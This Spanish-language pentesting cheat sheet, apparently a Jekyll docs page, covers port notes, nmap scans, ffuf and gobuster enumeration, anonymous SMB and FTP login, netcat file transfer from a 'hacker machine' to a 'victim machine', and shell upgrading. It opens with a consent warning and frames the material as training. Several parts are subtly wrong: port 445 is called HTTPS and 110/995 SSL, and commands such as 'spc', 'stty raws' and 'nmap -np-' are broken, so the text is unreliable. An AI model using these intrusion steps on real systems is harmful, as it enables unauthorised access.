---
title: Cheat Docs 🔰
layout: default
has_toc: false
nav_order: 2
has_children: false
---

# Pentesting  📕
---

{: .warning }
> Las herramientas presentes en este apartado son invasivas; **no** podemos utilizar estas técnicas sin el consentimiento o la aprobación por parte del objetivo.                     
>*Podemos emplearlas a nivel didáctico en plataformas como HacktheBox o TryHackme.*. 


**Pequeña guía sobre las herramientas básicas necesarias para el pentesting.**

## Puertos destacables 🔑
- 21 **(FTP)**  Posible acceso con login anónimo.

- 22 **(SSH)** Si obtenemos las credenciales podemos tener acceso al sistema a través de este servicio.

- 80 **(HTTP)** Servidor web - Enumeración de directorios y búsqueda de vulnerabilidades en el servidor web.

- 143 / 993 **(IMAP)** Ataques de fuerza bruta contra las credenciales del servidor de correo electrónico.

- 110 / 995 **(SSL)** Posibles ataques de fuerza bruta contra las credenciales del servidor POP3.

- 445 **(HTTPS)**: Enumeración de certificados SSL/TLS para revelar posibles debilidades en la configuración de seguridad del servidor.


# Escaneo de Red 💻

---

### Nmap
https://nmap.org/

Es una herramienta de escaneo de puertos y análisis de redes de código abierto que se utiliza para identificar hosts y servicios en una red

### Escaneo de Hosts:

`nmap -n -sn --reason --min-rate 2000 10.0.0.0/24 -oN hostDiscovery`

### Escaneo de Puertos:
`nmap -np- -Pn --min-rate 5000 -v 10.0.0.0 -oN tcpPort -`

### Escaneo en dDtalle de un puerto:

`nmap -n -p21 -Pn -T5 10.0.0.0 -oN tcpPort21 -sVC`


# Herramientas para Servicios web 🕸️

---

## FFuF 
https://github.com/ffuf/ffuf
Herramienta de fuzzing de código abierto.


### Enumeración de URL:
`ffuf -u http://localhost:3000/FUZZ  -fc 404,403 -t 200 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt`

### Enumeración de Archivos
`ffuf -u http://localhost:3000/FUZZ  -fc 404,403 -t 200 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words-lowercase.txt -e .php,.html,.txt`

### Enumeración de Subdominios
`ffuf -u http://FUZZ.localhost:3000/ -fc 404,403 -t 200 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt`

---

## Gobuster 
https://github.com/OJ/gobuster

Herramienta de enumeración de directorios y subdominios.


### Enumeración de URL:
`gobuster -w /usr/share/wordlists/dirb/common.txt dir -u http://domain.com -x php,txt,html,cgi`

### Enumeración de Subdominios:
`gobuster dns -d http://domain.com -w wordlist.txt -i`

### Enumeración de Pantallas Ocultas:
`gobuster vhost -u http://domain.com -w wordlist.txt -v`


# Servicio SMB 🔑

---

Protocolo responsable de transferir datos entre un cliente y un servidor en redes de área local. 

### Enumeracion de recursos compartidos:
`smbclient -L 10.10.10.10 -N`

`rpcclient -U "" -N 10.10.10.10`

### Entrar con login anonimo:
`smbclient //10.10.212.43/Anonymous/`


# FTP 💻

---


### Entrar con usuario anónimo
`ftp 10.0.0.0 21 `

`#Name:anonymous
#Pass: -

# Transferencia de archivos 🗃️

---

## PYTHON

`python3 -m http.server 8000`

`python2 -m SimpleHTTPServer 8000`

`curl http://10.10.10.10/file.php`

## Netcat

### Maquina hacker
`nc -lvnp 4444 < file`

### Maquina Victima

`nc 10.10.10.10 4444 > file`

## SSH

### Archivo
`spc file.txt user@10.10.10.10:/path/`

### Carpeta
`spc -r user@10.10.10.10:/folder /path/folder/`


# Shell Upgrading 🐚

---

`script /dev/null -c bash` 

`cntrl+Z`

`stty raw -echo; fg`

`reset xterm`

`export SHELL=bash`

`export TERM=xterm`

`stty raws <filas> cols <columnas>`